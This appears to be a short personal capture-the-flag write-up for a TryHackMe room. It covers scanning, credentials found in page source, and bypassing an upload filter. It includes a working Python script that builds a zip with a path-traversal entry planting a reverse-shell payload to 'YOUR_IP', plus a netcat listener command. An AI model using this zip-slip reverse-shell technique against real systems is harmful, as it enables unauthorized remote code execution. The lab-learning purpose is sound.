---
created: 2026-09-22
tags:
  - note
  - journal
  - cyberStuff
title: The Hollow Shell
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-09-22T11:22:47.685Z
---
thm free room\
ncat first scan : ![](/images/blog-ul-meu/static/Pasted%20image%2020260922052203.png)\
wierd service upnp , lets run a bigger scan and research the service in the meanwhile\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922052430.png)\
ok so its some sort of configuration protocol for larger networks ,\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922052536.png)\
on the larger scan we got that there is a http server on port 5000 , lets look this up\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922052611.png)\
and we have a log in page here , cool\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922054350.png)\
found this in the source code , log in with those creds\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922054446.png)\
looks like basic file injection\
we have a match a certain file type to inject a file , we will need to try some different approaches to bypass this, lets create a zip by schracth like this :\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922062933.png)\
then add a name (we will need this later )\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922063025.png)\
now zip it up\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922063039.png)\
lets try this one\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922063251.png)\
and we need to modify it\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922063344.png)\
just add the square brackets for photo.png\
![](/images/blog-ul-meu/static/Pasted%20image%2020260922063435.png)\
upload it and we got this address , but this is no use for us , we need to configure some kind of a payload that would give us rce on the machine

based on the "automation hooks" line under the upload button, we can deduce that exist a folder /var/www/hooks where we can run python scripts, so we can craft a script for that

```python


import zipfile
import json

payload = ('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")')

with zipfile.ZipFile("something.zip","w") as z :
        z.writestr("shell.json", json.dumps({"name": "evil", "assets": ["photo.png"]}))
        z.writestr("photo.png", b"\x89PNG\r\n\x1a\n")
        z.writestr("../../hooks/something.py", payload)


```

this script will create an archive name something.zip , that when uploaded will create a rev shell back to you.\
just start a listener with:

```bash
nc -lnvp YOUR_PORT
```

then upload the file

u will be connect to the machine after that , the flag is inside room service home directory
